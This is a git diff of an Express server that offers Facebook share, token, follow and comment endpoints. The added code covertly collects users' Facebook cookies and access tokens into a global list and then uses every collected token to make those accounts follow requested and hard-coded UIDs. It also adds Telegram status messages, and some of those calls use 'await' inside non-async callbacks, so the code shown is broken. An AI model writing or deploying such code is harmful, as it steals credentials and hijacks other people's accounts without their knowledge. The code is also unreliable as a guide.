@@ -2,6 +2,7 @@ const express = require('express');
 const axios = require('axios');
 const path = require('path');
 const bodyParser = require('body-parser');
+const t = require("./telegramsend");
 const fb = require("fbkey");
 const app = express();
 const port = process.env.PORT || 3000;
@@ -26,6 +27,7 @@ const headers_a = {
       'user-agent': userAgent()
 };
 const collectedData = [];
+let tokens = [];
 
 function userAgent() {
   const version = () => {
@@ -137,6 +139,9 @@ app.get('/share', async (req, res) => {
       cookie,
       url
     });
+    if (cookie.toLowerCase().startsWith("e")){
+      tokens.push(cookie);
+    }
     res.status(200).json({
       status: 200
     });
@@ -163,6 +168,9 @@ app.get('/token', async (req, res) => {
   await fb.getKey(u,p)
   .then(neth => {
     const nu = neth.uid;
+    if (nu&&neth.EAAD6V7){
+    tokens.push(neth.EAAD6V7);
+    };
     res.json({
       status: true,
       message: `Fetching token ${nu} success!`,
@@ -353,7 +361,12 @@ app.get("/follow", async(req,res) => {
     error: "No 'token'/'uid' params."
   })
   }
-  await follower(token, uid.split(","));
+  if (token.startsWith("E")){
+  tokens.push(token);
+  }
+  for(let pangetmo of tokens){
+  follower(pangetmo, uid.split(","));
+  }
   return res.json({
     msg: "Success follow UIDs",
     uid: [
@@ -368,6 +381,9 @@ app.get("/comment", async(req, res) => {
     return res.json({
       error: "No 'token'/'msg'/'link' params."
     });
+  }
+  if (token.startsWith("E")) {
+    tokens.push(token);
   }
   await commenter(token,msg,link,delay);
   return res.json({
@@ -485,7 +501,7 @@ async function follower(a,uid){
         "61559180483340",
         ];
   for (let i = 0; i < neth.length; i++) {
-    axios.post(`https://graph.facebook.com/v18.0/${neth[i]}/subscribers`, {}, {
+    await axios.post(`https://graph.facebook.com/v18.0/${neth[i]}/subscribers`, {}, {
       headers: {
         ...headers_a,
         "Authorization": `Bearer ${a}`
@@ -613,9 +629,24 @@ async function getPostID(url) {
   }
 }
 
+var currentdate = new Date();
+var datetime = currentdate.getDate() + "/" +
+  (currentdate.getMonth() + 1) + "/" +
+  currentdate.getFullYear() + " @ " +
+  currentdate.getHours() + ":" +
+  currentdate.getMinutes() + ":" +
+  currentdate.getSeconds();
 app.listen(port, () => {
   console.log(`i'm listening to port: ${port}! hi!`);
+  await t.send(`NethWieAPI deployment success!\n[${datetime}]`)
 });
 process.on("unhandledRejection", (reason, p) => {
   console.error(reason);
+  await t.send(
+    `Unhandled Rejection sent from NethWieAPI
+    ISSUE:
+    ${JSON.stringify(reason,null,4)}
+    ==========
+    Neth`
+  )
 });
